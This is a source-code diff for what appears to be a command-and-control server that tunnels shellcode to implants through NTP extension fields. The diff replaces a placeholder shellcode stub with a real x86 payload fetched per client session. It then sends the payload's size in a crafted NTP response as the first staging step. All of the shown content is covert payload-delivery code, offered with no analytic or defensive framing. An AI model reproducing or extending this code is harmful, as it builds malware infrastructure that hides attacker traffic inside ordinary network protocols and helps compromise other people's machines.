@@ -12,6 +12,7 @@
 #include "client.hpp"
 #include "constants.hpp"
 #include "globals.hpp"
+#include "teamserver.hpp"
 
 void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
     //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
@@ -96,11 +97,12 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             */
 
             //pretend the server sent this
-            std::vector<uint8_t> tempPayload = { 0x90,0x90,0xCC,0xC3 };
+            //std::vector<uint8_t> tempPayload = { 0x90,0x90,0xCC,0xC3 };
+            std::vector<uint8_t> payload = getx86Payload();
 
             //create or access client class:
             ClientSession someClient(sessionId);
-            someClient.setForClientBuffer(tempPayload);
+            someClient.setForClientBuffer(payload);
             std::cout << "[?] Stored in client class: ";
             printHexVector(someClient.getForClientBuffer());
             
@@ -109,7 +111,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             //this needs to be a size packet, which sends back the size of the payload.
             //future packets, wtih 0x00, will send the aactual paylaod
 
-            std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(tempPayload.size());
+            std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());
 
             NTPPacket newPacketClass;
             newPacketClass.addExtensionField(
@@ -120,6 +122,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             auto newPacket = newPacketClass.getPacket();
 
             sendNtpPacket(client_addr, sock, newPacket);
+            return; //done, so don't continue
         }
 
         else if (payloadArch == 0x64) {
